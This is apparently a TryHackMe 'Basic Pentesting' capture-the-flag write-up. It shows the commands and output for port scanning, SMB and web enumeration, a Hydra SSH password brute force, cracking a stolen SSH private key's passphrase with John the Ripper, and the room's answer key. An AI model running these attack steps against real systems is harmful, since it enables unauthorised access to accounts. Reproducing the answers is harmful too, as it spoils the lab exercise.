#	Basic Pentesting
[Room Link](https://tryhackme.com/room/basicpentestingjt)

Just Recorded Process what i do to solve the problem

<details><summary>NMap</summary>

```bash
nmap -sC -sV $thost
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 20:48 CDT
Nmap scan report for 10.10.80.115
Host is up (0.33s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-05-31T01:48:30
|_  start_date: N/A
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-05-30T21:48:29-04:00

```
</details>

<details><summary> enum4linux </summary>

`check enum4linux.log file`

</details>

<details><summary>SMBclient </summary> 

```bash
smbclient -L $thost -U guest 
Enter WORKGROUP\guests password: 

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2

smbclient \\\\$thost\\Anonymous -U guest
Enter WORKGROUP\guests password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 12:31:20 2018
  ..                                  D        0  Thu Apr 19 12:13:06 2018
  staff.txt                           N      173  Thu Apr 19 12:29:55 2018

		14318640 blocks of size 1024. 11094460 blocks available
smb: \> get staff.txt

cat staff.txt   
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know its all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

```


</details>

<details><summary>GoBuster</summary>

```bash

gobuster dir -u $thost -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.80.115
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/30 20:46:56 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/development          (Status: 301) [Size: 318] [--> http://10.10.80.115/development/]
/index.html           (Status: 200) [Size: 158]                                       [[A
/server-status        (Status: 403) [Size: 300]                                       
                                                                                      
===============================================================
2022/05/30 20:49:29 Finished
===============================================================
```
</details>

<details><summary>Hydra</summary>

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt $thost ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-30 22:09:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.80.115:22/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344238 to do in 1440:12h, 16 active
[STATUS] 113.67 tries/min, 341 tries in 00:03h, 14344063 to do in 2103:15h, 16 active
[STATUS] 108.29 tries/min, 758 tries in 00:07h, 14343646 to do in 2207:42h, 16 active
[22][ssh] host: 10.10.80.115   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-30 22:16:58

```

</details>

<details><summary>SSH Jan </summary>

```bash
jan@basic2:~$ ls
jan@basic2:~$ pwd
/home/jan
jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied
jan@basic2:/home/kay$ ./pass.bak
-bash: ./pass.bak: Permission denied
jan@basic2:/home/kay$ chmod +s pass.bak
chmod: changing permissions of 'pass.bak': Operation not permitted
jan@basic2:/home/kay$ cp pass.bak /home
cp: cannot open 'pass.bak' for reading: Permission denied
jan@basic2:/home/kay$ ls -l
total 4
-rw------- 1 kay kay 57 Apr 23  2018 pass.bak
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```
</details>

<details><summary> JohntheRipper </summary>

```bash
/usr/share/john/ssh2john.py kay_id_rsa > kay_id_rsa.hash
john kay_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
john -show kay_id_rsa.hash                                      
kay_id_rsa:beeswax

```
</details>

<details><summary> SSH kay </summary>

```bash
ssh kay@$thost -i kay_id_rsa.pub
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'kay_id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "kay_id_rsa": bad permissions
kay@10.10.80.115''s password: 

chmod 400 kay_id_rsa

ssh kay@$thost -i kay_id_rsa  
Enter passphrase for key 'kay_id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ Connection to 10.10.80.115 closed by remote host.
Connection to 10.10.80.115 closed.

```

</details>


<details><summary>Question And Answer </summary>


##	What is the name of the hidden directory on the web server(enter name without /)?
`/development`

#	User brute-forcing to find the username & password

##	What is the username?
`jan`

##	What is the password?
`armando`

##	What service do you use to access the server(answer in abbreviation in all caps)?
`ssh`

#	Enumerate the machine to find any vectors for privilege escalation
##	What is the name of the other user you found(all lower case)?
`kay`

#	If you have found another user, what can you do with this information?
##	What is the final password you obtain?
`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

</details>
